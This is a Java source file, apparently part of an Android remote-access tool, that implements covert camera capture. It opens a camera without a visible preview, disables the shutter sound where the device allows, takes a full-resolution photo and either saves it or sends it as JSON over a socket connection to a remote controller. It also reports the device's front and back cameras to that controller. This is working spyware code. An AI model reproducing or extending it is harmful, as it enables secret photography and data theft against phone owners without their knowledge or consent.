package com.remote.app.Managers;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import com.remote.app.IOSocket;
import com.remote.app.MainActivity;
import com.remote.app.MainService;
import com.remote.app.TypeOpenFile;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;


public class CameraManager {

    private Context context;
    private Camera camera;

    public CameraManager(Context context) {
        try {
            this.context =context;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void startUp(int cameraID, final boolean Online){
        if(MainService.isRecording==true)
            return;
        try{
            releaseCamera();
            camera = Camera.open(cameraID);
        }catch (RuntimeException e){
            e.printStackTrace();
        }


        Camera.CameraInfo info = new Camera.CameraInfo();
        Camera.getCameraInfo(cameraID, info);
		
        Display display = ((WindowManager) MainService.getContextOfApplication().getSystemService(Context.WINDOW_SERVICE))
                .getDefaultDisplay();
        int rotation = display.getRotation();
        int degrees = 0;

        switch (rotation) {
            case Surface.ROTATION_0:
                degrees = 0;
                break; //Natural orientation
            case Surface.ROTATION_90:
                degrees = 90;
                break; //Landscape left
            case Surface.ROTATION_180:
                degrees = 180;
                break;//Upside down
            case Surface.ROTATION_270:
                degrees = 270;
                break;//Landscape right
            default:
                throw new IllegalStateException("Unexpected value: " + rotation);
        }
        try{
            if(info.canDisableShutterSound)
                camera.enableShutterSound(false);
        }catch (Exception e){}


        int rotate = ( info.orientation - degrees + 360 ) % 360;

        Parameters parameters = camera.getParameters();

        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        Camera.Size size = allSizes.get(0);
        for (int i = 0; i < allSizes.size(); i++) {
            if (allSizes.get(i).width > size.width)
                size = allSizes.get(i);
        }

        parameters.setPictureSize(size.width, size.height);
        parameters.setRotation(rotate);


        camera.setParameters(parameters);
        try{
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        camera.takePicture(null, null, new PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                if(Online)
                    sendPhoto(data);
                else
                    savePhoto(data);
                releaseCamera();
            }
        });
    }

    private void savePhoto(byte [] data){

        try {
            FileOutputStream fos = new FileOutputStream(MainService.OpenFile(TypeOpenFile.Photo));
            fos.write(data);
            fos.close();
        } catch (Exception e) {
            releaseCamera();
        }
    }

    private void sendPhoto(byte [] data){

        try {
            File ff = MainService.OpenFile(TypeOpenFile.Photo);
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);
            //byte[] byteArr = bos.toByteArray();
           // final String encodedImage =  "data:image/jpeg;base64,"+ Base64.encodeToString(byteArr, Base64.DEFAULT);
            JSONObject object = new JSONObject();
            object.put("image",true);
            object.put("buffer" , bos.toByteArray());
            object.put("name" ,ff.getName());
            IOSocket.getInstance().getIoSocket().emit("0xCA" , object);


        } catch (Exception e) {
            releaseCamera();
        }

    }


    private void releaseCamera(){
        if (camera != null) {
            camera.stopPreview();
            camera.release();

            camera = null;
        }
    }


    public JSONObject findCameraList() {

        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }


        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList",true);

            // Search for available cameras
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                }
                else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK){
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                }
                else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }

            cameras.put("list" , list);
            return cameras;

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }

}
